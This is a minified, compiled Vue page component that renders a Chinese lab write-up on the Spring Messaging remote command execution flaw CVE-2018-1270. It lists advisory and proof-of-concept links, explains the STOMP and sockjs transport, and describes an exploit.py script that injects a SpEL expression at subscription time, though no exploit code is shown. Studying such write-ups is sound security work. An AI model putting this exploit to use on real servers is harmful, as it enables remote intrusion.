c(),i("div",null,[u,k,r,d,n("ul",null,[n("li",null,[n("a",v,[s("https://pivotal.io/security/cve-2018-1270"),t(a)])]),n("li",null,[n("a",m,[s("https://xz.aliyun.com/t/2252"),t(a)])]),n("li",null,[n("a",b,[s("https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12"),t(a)])]),n("li",null,[n("a",g,[s("https://github.com/CaledoniaProject/CVE-2018-1270"),t(a)])])]),h,n("ol",null,[n("li",null,[s("用 "),n("a",f,[s("STOMP协议"),t(a)]),s(" 将数据组合成一个文本流")]),n("li",null,[s("用 "),n("a",_,[s("sockjs协议"),t(a)]),s(" 发送文本流，sockjs 会选择一个合适的通道：websocket 或 xhr(http)，与后端通信")])]),y,n("p",null,[s("我编写了一个简单的 POC 脚本 "),n("a",w,[s("exploit.py"),t(a)]),s("（需要用 python3.6 执行），因为该漏洞是订阅的时候插入 SpEL 表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：")]),j])}const E=e(l,[["render",x],["__file","Spring Messaging 远程命令执行漏洞 CVE-2018-1270.html.vue"]]);export{E as default};
